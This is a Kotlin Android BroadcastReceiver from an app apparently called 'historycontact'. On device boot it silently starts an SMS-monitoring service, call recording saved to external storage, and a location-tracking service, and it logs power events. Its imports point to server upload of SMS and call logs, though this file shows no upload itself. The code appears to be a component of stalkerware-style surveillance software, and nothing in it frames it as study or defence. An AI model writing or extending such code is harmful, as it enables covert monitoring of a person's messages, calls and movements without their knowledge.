package an.xuan.tong.historycontact.smsradar.Receiver

import an.xuan.tong.historycontact.Constant
import an.xuan.tong.historycontact.api.ApiService
import an.xuan.tong.historycontact.api.Repository
import an.xuan.tong.historycontact.api.model.CallLogServer
import an.xuan.tong.historycontact.api.model.PowerAndInternet
import an.xuan.tong.historycontact.api.model.SmsSendServer
import an.xuan.tong.historycontact.call.CallRecord
import an.xuan.tong.historycontact.location.LocationService
import an.xuan.tong.historycontact.realm.RealmUtils
import an.xuan.tong.historycontact.smsradar.SmsRadarService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.os.Build
import android.os.Environment
import android.util.Log
import com.facebook.accountkit.Account
import com.facebook.accountkit.AccountKit
import com.facebook.accountkit.AccountKitCallback
import com.facebook.accountkit.AccountKitError
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.*


class SMSreceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if ("android.intent.action.BOOT_COMPLETED" == intent.action) {
            Log.e("antx", "onReceive sms BOOT_COMPLETED")
            //Handler Power
            RealmUtils.savePowerOnOff(true)

            //  updateInformation()
            val intentSms = Intent(context, SmsRadarService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intentSms)
            } else {
                context.startService(intentSms)
            }
            //Call
            var callRecord = CallRecord.Builder(context)
                    .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                    .setRecordDirName("Historycontact")
                    .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                    .setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                    .setShowSeed(true)
                    .build()

            callRecord.startCallRecordService()

            val intent = Intent()
            intent.setClass(context, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }

        }
        //Location

        if ("android.intent.action.QUICKBOOT_POWEROFF" == intent.action) {
            Log.e("antx", "onReceive sms QUICKBOOT_POWEROFF")
            RealmUtils.savePowerOnOff(false)
        }
        if ("android.intent.action.ACTION_SHUTDOWN" == intent.action) {
            Log.e("antx", "onReceive sms ACTION_SHUTDOWN")
            RealmUtils.savePowerOnOff(false)
            //ACTION_SHUTDOWN
        }
    }
}
